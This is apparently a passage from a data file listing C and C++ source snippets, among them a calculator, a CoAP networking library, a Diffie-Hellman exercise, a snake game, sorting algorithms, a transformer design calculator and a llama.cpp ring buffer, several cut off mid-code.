0;\n\t\t\n\t\t}\n\n\n\n\n\t}\n\n\n\n\n\treturn 0;\n}\n\n\nvoid numbers(double *ptr,int* i,bool *bptr, int* z) {\n\t\n\t\n\t\n\tif (*bptr == false) {\n\t\tsystem(\"cls\");\n\t\t*ptr = (*i - 48) + (*ptr * 10);\n\t\tcout << \"enter a number followed by an operation sign\" << endl;\n\t\tcout << fixed << setprecision(0) << *ptr << endl;\n\t\t*i = _getch();\n\t}\n\telse\n\t{\n\t\tif (*i == 46) {\n\t\t\t*i = 48;\n\t\t\t*z = 0;\n\t\t}\n\n\t\tsystem(\"cls\");\n\t\t*ptr = *ptr + ((*i - 48) / (pow(10, *z)));\n\t\tcout << \"enter a number followed by an operation sign\" << endl;\n\t\tcout << fixed << setprecision(6) << *ptr << endl;\n\t\t*i = _getch();\n\n\t}\n\tif (*i == 46 && *bptr == false) {\n\t\t*bptr = true;\n\t}\n}\n\n\nvoid ops(double* fptr, double* sptr, int op) {\n\n\tswitch (op) {\n\n\tcase 43:\n\t\t*fptr = *fptr + *sptr;\n\t\tbreak;\n\tcase 45:\n\t\t*fptr = *fptr - *sptr;\n\t\tbreak;\n\tcase 47:\n\t\t*fptr = *fptr / *sptr;\n\t\tbreak;\n\n\tcase 42:\n\t\t*fptr = *fptr * *sptr;\n\t\tbreak;\n\n\n\t}\n\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  unsigned int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"coap-simple.h\"\n#include \"Arduino.h\"\n\n#define LOGGING\n\nvoid CoapPacket::addOption(uint8_t number, uint8_t length, uint8_t *opt_payload)\n{\n    options[optionnum].number = number;\n    options[optionnum].length = length;\n    options[optionnum].buffer = opt_payload;\n\n    ++optionnum;\n}\n\n\nCoap::Coap(\n    UDP& udp,\n    int coap_buf_size  /* default value is COAP_BUF_MAX_SIZE */\n) {\n    this->_udp = &udp;\n    this->coap_buf_size = coap_buf_size;\n    this->tx_buffer = new uint8_t[this->coap_buf_size];\n    this->rx_buffer = new uint8_t[this->coap_buf_size];\n}\n\nCoap::~Coap() {\n    if (this->tx_buffer != NULL)\n      delete[] this->tx_buffer;\n\n    if (this->rx_buffer != NULL)\n      delete[] this->rx_buffer;\n}\n\nbool Coap::start() {\n    this->start(COAP_DEFAULT_PORT);\n    return true;\n}\n\nbool Coap::start(int port) {\n    this->_udp->begin(port);\n    return true;\n}\n\nuint16_t Coap::sendPacket(CoapPacket &packet, IPAddress ip) {\n    return this->sendPacket(packet, ip, COAP_DEFAULT_PORT);\n}\n\nuint16_t Coap::sendPacket(CoapPacket &packet, IPAddress ip, int port) {\n    uint8_t *p = this->tx_buffer;\n    uint16_t running_delta = 0;\n    uint16_t packetSize = 0;\n\n    // make coap packet base header\n    *p = 0x01 << 6;\n    *p |= (packet.type & 0x03) << 4;\n    *p++ |= (packet.tokenlen & 0x0F);\n    *p++ = packet.code;\n    *p++ = (packet.messageid >> 8);\n    *p++ = (packet.messageid & 0xFF);\n    p = this->tx_buffer + COAP_HEADER_SIZE;\n    packetSize += 4;\n\n    // make token\n    if (packet.token != NULL && packet.tokenlen <= 0x0F) {\n        memcpy(p, packet.token, packet.tokenlen);\n        p += packet.tokenlen;\n        packetSize += packet.tokenlen;\n    }\n\n    // make option header\n    for (int i = 0; i < packet.optionnum; i++)  {\n        uint32_t optdelta;\n        uint8_t len, delta;\n\n        if (packetSize + 5 + packet.options[i].length >= coap_buf_size) {\n            return 0;\n        }\n        optdelta = packet.options[i].number - running_delta;\n        COAP_OPTION_DELTA(optdelta, &delta);\n        COAP_OPTION_DELTA((uint32_t)packet.options[i].length, &len);\n\n        *p++ = (0xFF & (delta << 4 | len));\n        if (delta == 13) {\n            *p++ = (optdelta - 13);\n            packetSize++;\n        } else if (delta == 14) {\n            *p++ = ((optdelta - 269) >> 8);\n            *p++ = (0xFF & (optdelta - 269));\n            packetSize+=2;\n        } if (len == 13) {\n            *p++ = (packet.options[i].length - 13);\n            packetSize++;\n        } else if (len == 14) {\n            *p++ = (packet.options[i].length >> 8);\n            *p++ = (0xFF & (packet.options[i].length - 269));\n            packetSize+=2;\n        }\n\n        memcpy(p, packet.options[i].buffer, packet.options[i].length);\n        p += packet.options[i].length;\n        packetSize += packet.options[i].length + 1;\n        running_delta = packet.options[i].number;\n    }\n\n    // make payload\n    if (packet.payloadlen > 0) {\n        if ((packetSize + 1 + packet.payloadlen) >= coap_buf_size) {\n            return 0;\n        }\n        *p++ = 0xFF;\n        memcpy(p, packet.payload, packet.payloadlen);\n        packetSize += 1 + packet.payloadlen;\n    }\n    _udp->beginPacket(ip, port);\n    _udp->write(this->tx_buffer, packetSize);\n    _udp->endPacket();\n\n    return packet.messageid;\n}\n\nuint16_t Coap::get(IPAddress ip, int port, const char *url) {\n    return this->send(ip, port, url, COAP_CON, COAP_GET, NULL, 0, NULL, 0);\n}\n\nuint16_t Coap::post(IPAddress ip, int port, const char *url, const char *payload) {\n    return this->send(ip, port, url, COAP_NONCON, COAP_POST, NULL, 0, (uint8_t *)payload, strlen(payload));\n}\n\nuint16_t Coap::post(IPAddress ip, int port, const char *url, const char *payload, size_t payloadlen) {\n    return this->send(ip, port, url, COAP_NONCON, COAP_POST, NULL, 0, (uint8_t *)payload, payloadlen);\n}\n\nuint16_t Coap::send(IPAddress ip, int port, const char *url, COAP_TYPE type, COAP_METHOD method, const uint8_t *token, uint8_t tokenlen, const uint8_t *payload, size_t payloadlen) {\n    return this->send(ip, port, url, type, method, token, tokenlen, payload, payloadlen, COAP_NONE);\n}\n\nuint16_t Coap::send(IPAddress ip, int port, const char *url, COAP_TYPE type, COAP_METHOD method, const uint8_t *token, uint8_t tokenlen, const uint8_t *payload, size_t payloadlen, COAP_CONTENT_TYPE content_type) {\n    return this->send(ip, port, url, type, method, token, tokenlen, payload, payloadlen, content_type, rand());\n}\n\nuint16_t Coap::send(IPAddress ip, int port, const char *url, COAP_TYPE type, COAP_METHOD method, const uint8_t *token, uint8_t tokenlen, const uint8_t *payload, size_t payloadlen, COAP_CONTENT_TYPE content_type, uint16_t messageid) {\n\n    // make packet\n    CoapPacket packet;\n\n    packet.type = type;\n    packet.code = method;\n    packet.token = token;\n    packet.tokenlen = tokenlen;\n    packet.payload = payload;\n    packet.payloadlen = payloadlen;\n    packet.optionnum = 0;\n    packet.messageid = messageid;\n\n    // use URI_HOST UIR_PATH\n    char ipadd",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <cstring>\n#include <algorithm>\n#include <stack>\n#include <vector>\n\nstruct LargeNumber {\n    int digits[309] = {};\n    bool is_negative = false;\n};\n\nstruct DivisionResult{\n    LargeNumber quotient;\n    LargeNumber remainder;\n};\n\nnamespace LargeNumberConversion {\n    LargeNumber copyLargeNumber(LargeNumber large_number);\n    LargeNumber addLeadingDigit(LargeNumber large_number, int digit);\n    bool isEqualToZero(LargeNumber large_number);\n}\n\nnamespace LargeNumberArithmetic {\n    LargeNumber addLargeNumbers(LargeNumber first, LargeNumber second);\n    LargeNumber subtractLargeNumbers(LargeNumber minuend, LargeNumber subtrahend);\n    LargeNumber multiplyLargeNumbers(LargeNumber first, LargeNumber second);\n    DivisionResult divideBySmallNumber(LargeNumber dividend, LargeNumber divisor);\n    DivisionResult divideByLargeNumber(LargeNumber dividend, LargeNumber divisor);\n}\n\nnamespace LargeNumberSpecialOperations {\n    LargeNumber modularExponentiation(LargeNumber base, LargeNumber exponent, LargeNumber modulus);\n}\n\nstruct LargeNumberArray {\n    LargeNumber result;\n    LargeNumber count;\n};\n\nclass BigInteger {\npublic:\n    std::string digits;\n    BigInteger(std::string &);\n    BigInteger(BigInteger &);\n    BigInteger(unsigned long long n = 0);\n    BigInteger(const char *);\n    friend void divide_by_2(BigInteger &a);\n    friend bool isNull(const BigInteger &);\n    friend int getLength(const BigInteger &);\n    int operator[](const int) const;\n    BigInteger &operator=(const BigInteger &);\n    BigInteger &operator++();\n    BigInteger operator++(int temp);\n    BigInteger &operator--();\n    BigInteger operator--(int temp);\n    friend BigInteger &operator+=(BigInteger &, const BigInteger &);\n    friend BigInteger operator+(const BigInteger &, const BigInteger &);\n    friend BigInteger &operator-=(BigInteger &, const BigInteger &);\n    friend BigInteger operator-(const BigInteger &, const BigInteger &);\n    friend bool operator==(const BigInteger &, const BigInteger &);\n    friend bool operator>(const BigInteger &, const BigInteger &);\n    friend bool operator<(const BigInteger &, const BigInteger &);\n    friend bool operator<=(const BigInteger &, const BigInteger &);\n    friend BigInteger &operator*=(BigInteger &, const BigInteger &);\n    friend BigInteger operator*(const BigInteger &, const BigInteger &);\n    friend BigInteger &operator/=(BigInteger &, const BigInteger &);\n    friend BigInteger operator/(const BigInteger &, const BigInteger &);\n    friend BigInteger operator%(const BigInteger &, const BigInteger &);\n    friend BigInteger &operator%=(BigInteger &, const BigInteger &);\n    friend BigInteger &operator^=(BigInteger &, const BigInteger &);\n    friend BigInteger operator^(BigInteger &, const BigInteger &);\n};\n\nnamespace ConversionOperations {\n    LargeNumber convertStringToArray(std::string large_number);\n    std::string convertDecimalToHexBigEndian(LargeNumber decimal);\n    BigInteger convertHexadecimalToDecimal(std::string hexVal);\n    std::string convertBigIntegerToString(BigInteger &bigInteger);\n}\n\nint main(int argc, char **argv) {\n    std::string hexPrime, hexGenerator, hexPrivateKeyA, hexPrivateKeyB;\n    BigInteger decimalPrime, decimalGenerator, decimalPrivateKeyA, decimalPrivateKeyB;\n    if (argc < 3) std::cout << \"Not enough Command Line Arguments passed!\";\n    else {\n        std::ifstream inputFile(argv[1]);\n        inputFile >> hexPrime;\n        inputFile >> hexGenerator;\n        inputFile >> hexPrivateKeyA;\n        inputFile >> hexPrivateKeyB;\n        inputFile.close();\n        decimalPrime = ConversionOperations::convertHexadecimalToDecimal(hexPrime);\n        decimalGenerator = ConversionOperations::convertHexadecimalToDecimal(hexGenerator);\n        decimalPrivateKeyA = ConversionOperations::convertHexadecimalToDecimal(hexPrivateKeyA);\n        decimalPrivateKeyB = ConversionOperations::convertHexadecimalToDecimal(hexPrivateKeyB);\n        LargeNumber prime, generator, privateKeyA, privateKeyB, publicKeyA, publicKeyB, sharedKey, productOfKeys;\n        std::string tempString = ConversionOperations::convertBigIntegerToString(decimalPrime);\n        prime = ConversionOperations::convertStringToArray(tempString);\n        tempString = ConversionOperations::convertBigIntegerToString(decimalGenerator);\n        generator = ConversionOperations::convertStringToArray(tempString);\n        tempString = ConversionOperations::convertBigIntegerToString(decimalPrivateKeyA);\n        privateKeyA = ConversionOperations::convertStringToArray(tempString);\n        tempString = ConversionOperations::convertBigIntegerToString(decimalPrivateKeyB);\n        privateKeyB = ConversionOperations::convertStringToArray(tempString);\n        publicKeyA = LargeNumberSpecialOperations::modularExponentiation(generator, privateKeyA, prime);\n        publicKeyB = LargeNumberSpecialOperations::modularExponentiation(generator, privateKeyB, prime);\n        productOfKeys = LargeNu",
    "#include \"Snake.h\"\n#include \"State.h\"\n#include \"Constants.h\"\n#include \"Difficulty.h\"\n\n#include <raylib.h>\n#include <raymath.h>\n\nvoid Snake::draw() {\n\tfor (unsigned int i = 0; i < body.size(); i++) {\n\t\tfloat x = body[i].x;\n\t\tfloat y = body[i].y;\n\t\tRectangle segment = Rectangle{offset + x*cellSize, offset + y*cellSize, (float) cellSize, (float) cellSize};\n\t\tDrawRectangleRounded(segment, 0.5, 6, snakeColor);\n\t}\n}\n\nvoid Snake::update(Difficulty difficulty) {\n\tif (addSegment) {\n\t\taddSegment = false;\n\t}\n\telse {\n\t\tbody.pop_back();\n\t}\n\tVector2 new_head = Vector2Add(body[0], direction);\n\tif (difficulty == EASY) {\n\t\tdouble x = new_head.x;\n\t\tdouble y = new_head.y;\n\t\tif (x == -1) {\n\t\t\tnew_head = Vector2{ (float)cellCount - 1, (float)y };\n\t\t}\n\t\telse if (x == cellCount) {\n\t\t\tnew_head = Vector2{ 0, (float)y };\n\t\t}\n\t\telse if (y == -1) {\n\t\t\tnew_head = Vector2{ (float)x, (float)cellCount - 1 };\n\t\t}\n\t\telse if (y == cellCount) {\n\t\t\tnew_head = Vector2{ (float)x, 0 };\n\t\t}\n\t}\n\tbody.push_front(new_head);\n}\n\nvoid Snake::reset() {\n\tbody = { Vector2{6,9}, Vector2{5,9}, Vector2{4,9} };\n\tdirection = { 1, 0 };\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nclass SimpleSort {\nprivate:\n    void insert_sort(int arr[], int n)\n    // \u76f4\u63a5\u63d2\u5165\u6392\u5e8f\n    // \u5c06\u6570\u7ec4\u5206\u6210\u4e24\u90e8\u5206\uff0c\u5de6\u8fb9\u90e8\u5206\u662f\u5df2\u6392\u5e8f\u7684\uff0c\u53f3\u8fb9\u90e8\u5206\u662f\u672a\u6392\u5e8f\u7684\n    // \u5c06\u672a\u6392\u5e8f\u90e8\u5206\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u63d2\u5165\u5230\u5df2\u6392\u5e8f\u90e8\u5206\u7684\u6b63\u786e\u4f4d\u7f6e\n    // \u65f6\u95f4\u590d\u6742\u5ea6: O(n^2); \u7a7a\u95f4\u590d\u6742\u5ea6: O(1)\n    {\n        for (int i = 1; i < n; i++) {\n            int key = arr[i];\n            int j = i - 1;\n\n            //\n            while (j >= 0 && arr[j] > key) {\n                arr[j + 1] = arr[j];\n                j = j - 1;\n            }\n            arr[j + 1] = key;\n        }\n    }\n\n    void binary_insert_sort(int arr[], int n)\n    // \u6298\u534a\u63d2\u5165\u6392\u5e8f\n    // \u65f6\u95f4\u590d\u6742\u5ea6: O(n^2); \u7a7a\u95f4\u590d\u6742\u5ea6: O(1)\n    // \u4e3a\u4ec0\u4e48?\n    // 1. \u4e8c\u5206\u67e5\u627e: O(logn)\n    // 2. \u79fb\u52a8\u5143\u7d20: O(n); \u79fb\u52a8 n \u4e2a\u5143\u7d20\n    // 3. \u603b\u65f6\u95f4\u590d\u6742\u5ea6: O(n^2)\n    {\n        for (int i = 1; i < n; i++) {\n            int key = arr[i];\n            int left = 0;\n            int right = i - 1;\n            int mid;\n            // Use binary search to find the correct position to insert the element\n            while (left <= right) {\n                mid = (left + right) / 2;\n                if (arr[mid] > key) {\n                    right = mid - 1;\n                } else {\n                    left = mid + 1;\n                }\n            }\n            // Move elements to make space for the key\n            for (int j = i - 1; j >= left; j--) {\n                arr[j + 1] = arr[j];\n            }\n            arr[left] = key;\n        }\n    }\n\n    void swap(int* a, int* b)\n    {\n        int temp = *a;\n        *a = *b;\n        *b = temp;\n    }\n    void bubble_sort(int arr[], int n)\n    // \u5192\u6ce1\u6392\u5e8f bubble_sort\n    // time complexity: O(n^2); space complexity: O(1)\n    {\n        for (int i = 0; i < n - 1; i++) {\n            for (int j = 0; j < n - i - 1; j++)\n            // n - i - 1: the last i elements are already sorted\n            // because the largest element is already at the end of the array\n            {\n                if (arr[j] > arr[j + 1]) {\n                    swap(&arr[j], &arr[j + 1]);\n                }\n            }\n        }\n    }\n\n    void select_sort(int arr[], int n)\n    // \u9009\u62e9\u6392\u5e8f select_sort\n    // time complexity: O(n^2); space complexity: O(1)\n    {\n        for (int i = 0; i < n - 1; i++) {\n            int min_element_index = i;\n            for (int j = i + 1; j < n; j++) {\n                if (arr[j] < arr[min_element_index]) {\n                    min_element_index = j;\n                }\n            }\n            if (min_element_index != i) {\n                swap(&arr[i], &arr[min_element_index]);\n            }\n        }\n    }\n};\n\nclass MergeSort {\n    // \u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(nlogn)\n    // \u7a7a\u95f4\u590d\u6742\u5ea6\uff1a\u9700\u8981\u4e00\u4e2a\u5927\u5c0f\u4e3an\u7684\u4e34\u65f6\u6570\u7ec4\uff0c\u6240\u4ee5\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3aO(n)\n    // \u9012\u5f52\u6df1\u5ea6\uff1alogn\uff0c\u6240\u4ee5\u7a7a\u95f4\u590d\u6742\u5ea6\u4e3aO(logn)\nprivate:\n    void merge(int arr[], int leftBoundary, int mid, int rightBoundary)\n    {\n        int leftPointer = leftBoundary;\n        int rightPointer = mid + 1;\n        int tempPointer = 0;\n        // \u7533\u8bf7\u4e00\u4e2a\u4e34\u65f6\u6570\u7ec4\uff0c\u5927\u5c0f\u4e3a\u5c06\u8981\u5408\u5e76\u7684\u4e24\u4e2a\u6570\u7ec4\u7684\u5927\u5c0f\u4e4b\u548c\n        int* temp = (int*)malloc((rightBoundary - leftBoundary + 1) * sizeof(int));\n        // \u5408\u5e76\u4e24\u4e2a\u6570\u7ec4\u5e76\u6392\u5e8f\n        while (leftPointer <= mid && rightPointer <= rightBoundary) {\n            if (arr[leftPointer] <= arr[rightPointer]) {\n                temp[tempPointer++] = arr[leftPointer++];\n            } else {\n                temp[tempPointer++] = arr[rightPointer++];\n            }\n        }\n        while (leftPointer <= mid) {\n            temp[tempPointer++] = arr[leftPointer++];\n        }\n        while (rightPointer <= rightBoundary) {\n            temp[tempPointer++] = arr[rightPointer++];\n        }\n        // \u5c06\u6392\u5e8f\u597d\u7684\u4e34\u65f6\u6570\u7ec4\u590d\u5236\u56de\u539f\u6570\u7ec4\n        for (int i = 0; i < tempPointer; i++) {\n            arr[leftBoundary + i] = temp[i];\n        }\n        free(temp);\n    }\n    void merge_sort(int arr[], int leftBoundary, int rightBoundary)\n    {\n        if (leftBoundary < rightBoundary) {\n            int mid = (leftBoundary + rightBoundary) / 2;\n            merge_sort(arr, leftBoundary, mid);\n            merge_sort(arr, mid + 1, rightBoundary);\n            merge(arr, leftBoundary, mid, rightBoundary);\n        }\n        // \u7ec8\u6b62\u60c5\u51b5: left == right\n        // \u6b64\u65f6\u6570\u7ec4\u4e2d\u53ea\u6709\u4e00\u4e2a\u5143\u7d20\n        // \u9012\u5f52\u8fd4\u56de\n        // merge\u628a\u4e24\u4e2a\u5143\u7d20\u6392\u5e8f\uff0c\u6210\u4e3a\u4e00\u4e2a\u542b\u4e24\u4e2a\u5143\u7d20\u7684\u6709\u5e8f\u6570\u7ec4\n    }\n};\n\nclass QuickSort {\n    // \u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(nlogn) \u6700\u574f\u60c5\u51b5\uff1aO(n^2)\n    // \u7a7a\u95f4\u590d\u6742\u5ea6\uff1a\u53d6\u51b3\u4e8e\u9012\u5f52\u6df1\u5ea6\uff0c\u6700\u574f\u60c5\u51b5\uff1aO(n)\uff0c\u5e73\u5747\u60c5\u51b5\uff1aO(logn)\nprivate:\n    void Swap(int* a, int* b)\n    {\n        int temp = *a;\n        *a = *b;\n        *b = temp;\n    }\n    int Partition(int array[], int lowPointer, int highPointer)\n    {\n        // \u786e\u5b9a\u67a2\u8f74\n        int pivot = array[lowPointer];\n        // \u67a2\u8f74\u62ff\u51fa\u6765\uff0c\u79bb\u5f00\u7684\u4f4d\u7f6e\u89c6\u4e3a\u7a7a\n        while (highPointer > lowPointer) {\n            while (array[highPointer] >= pivot && highPointer > lowPointer) {\n                highPointer--;\n            }\n            Swap(&array[highPointer], &array[lowPointer]);\n            while (array[lowPointer] <= pivot && highPointer > lowPointer) {\n                lowPointer++;\n            }\n            Swap(&array[highPointer], &array[lowPointer]);\n        }\n        int pivotIndex = lowPointer;\n        return pivotIndex;\n    }\n    void quick_sort(int array[], int low, int high)\n    {\n        if (low < high)",
    "#include<iostream>\r\n#include<cmath>\r\n#include <iomanip>\r\nusing namespace std;\r\n#define pi 3.1416\r\nint main(){\r\n    int ID;\r\n    cout<<\"Enter Your ID: \";\r\n    cin>>ID;\r\n    int LV_layer;\r\n    cout<<\"Enter LV Layer: \";\r\n    cin>>LV_layer;\r\n    int HV_Layer;\r\n    cout<<\"Enter HV Layer: \";\r\n    cin>>HV_Layer;\r\n\r\n    int R = ID % 100;\r\n    double KVA = 25+(5*R);\r\n    if (KVA <= 0){\r\n        cout << \"Error: KVA must be a positive value.\\n\";\r\n        return 0;\r\n    }\r\n    double HV;\r\n    double LV;\r\n    double Temp = 75;\r\n    // Check if R is even or odd and assign values\r\n    if (R % 2 == 0) {\r\n        HV = 6600;\r\n        LV = 415;\r\n    } else {\r\n        HV = 11000;\r\n        LV = 400;\r\n    }\r\n    int Number_of_legs = 3;\r\n    double Voltage_per_turn = (sqrt((KVA*1000)/(Number_of_legs))) / (40);\r\n    double CRGO_stell_lamination = 0.35;\r\n    double Specific_magnetic_loading = 1.7;\r\n    int Frequency = 50;\r\n    double Net_cross_section_area_of_the_core = (Voltage_per_turn*1000000)/(4.44*Frequency*Specific_magnetic_loading);\r\n    int Step = 7;\r\n    double Iron_space_factor = 0.88;\r\n    double Stacking_factor_for_lamination = 0.92;\r\n    double Diameter_of_the_core = sqrt((4*Net_cross_section_area_of_the_core)/(Iron_space_factor*Stacking_factor_for_lamination*pi));\r\n    Diameter_of_the_core = ((Diameter_of_the_core/10)+1)*10;\r\n    Net_cross_section_area_of_the_core = Iron_space_factor*Stacking_factor_for_lamination*(pi/4)*Diameter_of_the_core*Diameter_of_the_core;\r\n    Specific_magnetic_loading = (Voltage_per_turn*1000000)/(4.44*Frequency*Net_cross_section_area_of_the_core);\r\n\r\n    cout << \"\\n=== CORE PARAMETERS ===\\n\";\r\n    cout << \"Voltage per turn: \" << Voltage_per_turn << \" V\\n\";\r\n    cout << \"Net cross-section area of core: \" << Net_cross_section_area_of_the_core << \" mm\u00b2\\n\";\r\n    cout << \"Diameter of core: \" << Diameter_of_the_core << \" mm\\n\";\r\n    cout << \"Specific magnetic loading: \" << Specific_magnetic_loading << \" T\\n\";\r\n\r\n    double Window_space_factor = (10)/(30+(HV/1000));\r\n    double Current_density = 2.5;\r\n    double Window_area = (KVA*1000000000)/(3.33*Net_cross_section_area_of_the_core*Window_space_factor*Current_density*Specific_magnetic_loading*Frequency);\r\n\r\n    cout << \"\\n=== WINDOW PARAMETERS ===\\n\";\r\n    cout << \"Window space factor: \" << Window_space_factor << endl;\r\n    cout << \"Window area: \" << Window_area << \" mm\u00b2\\n\";\r\n\r\n    double Voltage_per_phase_in_LV = LV/sqrt(3);\r\n    int Number_of_turn_in_LV = Voltage_per_phase_in_LV / Voltage_per_turn;\r\n    double Voltage_per_phase_in_HV = HV;\r\n    int Number_of_turn_in_HV = (Voltage_per_phase_in_HV / Voltage_per_turn)*1.05;\r\n    int Number_of_turn_in_HV_Normal = (Voltage_per_phase_in_HV / Voltage_per_turn);\r\n    double Current_through_LV_winding = (KVA*1000)/ (sqrt(3)*LV);\r\n    int Area_of_LV_conductor = Current_through_LV_winding/Current_density;\r\n\r\n    cout << \"\\n=== WINDING PARAMETERS ===\\n\";\r\n    cout << \"Voltage per phase in LV: \" << Voltage_per_phase_in_LV << \" V\\n\";\r\n    cout << \"Number of turns in LV: \" << Number_of_turn_in_LV << endl <<endl;\r\n    cout << \"Voltage per phase in HV: \" << Voltage_per_phase_in_HV << \" V\\n\";\r\n    cout << \"Number of turns in HV: \" << Number_of_turn_in_HV << endl <<endl;\r\n    cout << \"Current through LV winding: \" << Current_through_LV_winding << \" A\\n\";\r\n    cout << \"Area of LV conductor: \" << Area_of_LV_conductor << \" mm\u00b2\\n\"<<endl;\r\n\r\n    double Thinckness_of_LV_wire;\r\n    double Width_of_LV_wire;\r\n    // W and T constraints\r\n    double W_min = 2, W_max = 16, T_min = 0.8, T_max = 5.6;\r\n    const double tolerance = 0.01; // Allowable error for floating-point comparison\r\n\r\n    bool found = false; // Flag to stop loops once a valid pair is found\r\n\r\n    for (double W = W_min; W <= W_max; W += 0.1) { // Iterate over W with a step of 0.1\r\n        for (double T = T_min; T <= T_max; T += 0.1) { // Iterate over T with a step of 0.1\r\n            // Check if the area is approximately equal to 2 * T * W\r\n            if (abs(2 * T * W - Area_of_LV_conductor) <= tolerance && (1.4 < W / T && W / T < 8)) {\r\n                Width_of_LV_wire=(W * 10) / 10;\r\n                Thinckness_of_LV_wire = (T * 10) / 10;\r\n                found = true; // Set the flag to true\r\n                break; // Exit the inner loop\r\n            }\r\n        }\r\n        if (found) break; // Exit the outer loop if a pair is found\r\n    }\r\n\r\n    if (!found) {\r\n        cout << \"No valid values of W and T found for the given area.\\n\";\r\n        return 0;\r\n    }\r\n    \r\n    //Area_of_LV_conductor = 2*Thinckness_of_LV_wire*Width_of_LV_wire;\r\n\r\n    cout<<\"Thinckness of LV wire = \"<<Thinckness_of_LV_wire<<endl;\r\n    cout<<\"Width of LV wire = \"<<Width_of_LV_wire<<endl<<endl;\r\n\r\n    double Current_through_HV_winding = (KVA*1000)/(3*HV);\r\n    double Area_of_HV_conductor = Current_through_HV_winding / Current_density;\r\n    double Diameter_of_the_conductor = sqrt((4*Area_of_HV_conductor)/(pi));\r\n    double Copper_area_in_window = 2* ((Area_of_HV_conductor*Number_of_turn",
    "#include \"Bureaucrat.hpp\"\n\nBureaucrat::Bureaucrat() : _name(\"default\"), _grade(150) {\n}\n\nBureaucrat::Bureaucrat(std::string name, int grade) : _name(name) {\n    if (grade < 1)\n        throw GradeTooHighException();\n    if (grade > 150)\n        throw GradeTooLowException();\n    _grade = grade;\n}\n\nBureaucrat::Bureaucrat(const Bureaucrat& otherBureaucrat) : \n    _name(otherBureaucrat._name), _grade(otherBureaucrat._grade) {\n}\n\nBureaucrat& Bureaucrat::operator=(const Bureaucrat& otherBureaucrat) {\n    if (this != &otherBureaucrat) {\n        _grade = otherBureaucrat._grade;\n    }\n    return *this;\n}\n\nBureaucrat::~Bureaucrat() {\n}\n\nstd::string Bureaucrat::getName() const {\n    return _name;\n}\n\nint Bureaucrat::getGrade() const {\n    return _grade;\n}\n\nvoid Bureaucrat::incrementGrade() {\n    if (_grade <= 1)\n        throw GradeTooHighException();\n    _grade--;\n}\n\nvoid Bureaucrat::decrementGrade() {\n    if (_grade >= 150)\n        throw GradeTooLowException();\n    _grade++;\n}\n\nconst char* Bureaucrat::GradeTooHighException::what() const noexcept {\n    return \"Grade is too high!\";\n}\n\nconst char* Bureaucrat::GradeTooLowException::what() const noexcept {\n    return \"Grade is too low!\";\n}\n\nstd::ostream& operator<<(std::ostream& os, const Bureaucrat& bureaucrat) {\n    os << bureaucrat.getName() << \", bureaucrat grade \" << bureaucrat.getGrade();\n    return os;\n}",
    "#include \"sampling.h\"\n\n#include \"common.hpp\"\n\n#include <cmath>\n#include <unordered_map>\n\n// the ring buffer works similarly to std::deque, but with a fixed capacity\n// TODO: deduplicate with llama-impl.h\ntemplate<typename T>\nstruct ring_buffer {\n    ring_buffer(size_t cap) : capacity(cap), data(cap) {}\n\n    T & front() {\n        if (sz == 0) {\n            throw std::runtime_error(\"ring buffer is empty\");\n        }\n        return data[first];\n    }\n\n    const T & front() const {\n        if (sz == 0) {\n            throw std::runtime_error(\"ring buffer is empty\");\n        }\n        return data[first];\n    }\n\n    T & back() {\n        if (sz == 0) {\n            throw std::runtime_error(\"ring buffer is empty\");\n        }\n        return data[pos];\n    }\n\n    const T & back() const {\n        if (sz == 0) {\n            throw std::runtime_error(\"ring buffer is empty\");\n        }\n        return data[pos];\n    }\n\n    void push_back(const T & value) {\n        if (sz == capacity) {\n            // advance the start when buffer is full\n            first = (first + 1) % capacity;\n        } else {\n            sz++;\n        }\n        data[pos] = value;\n        pos = (pos + 1) % capacity;\n    }\n\n    T pop_front() {\n        if (sz == 0) {\n            throw std::runtime_error(\"ring buffer is empty\");\n        }\n        T value = data[first];\n        first = (first + 1) % capacity;\n        sz--;\n        return value;\n    }\n\n    const T & rat(size_t i) const {\n        if (i >= sz) {\n            throw std::runtime_error(\"ring buffer: index out of bounds\");\n        }\n        return data[(first + sz - i - 1) % capacity];\n    }\n\n    std::vector<T> to_vector() const {\n        std::vector<T> result;\n        result.reserve(sz);\n        for (size_t i = 0; i < sz; i++) {\n            result.push_back(data[(first + i) % capacity]);\n        }\n        return result;\n    }\n\n    void clear() {\n        // here only reset the status of the buffer\n        sz = 0;\n        first = 0;\n        pos = 0;\n    }\n\n    bool empty() const {\n        return sz == 0;\n    }\n\n    size_t size() const {\n        return sz;\n    }\n\n    size_t capacity = 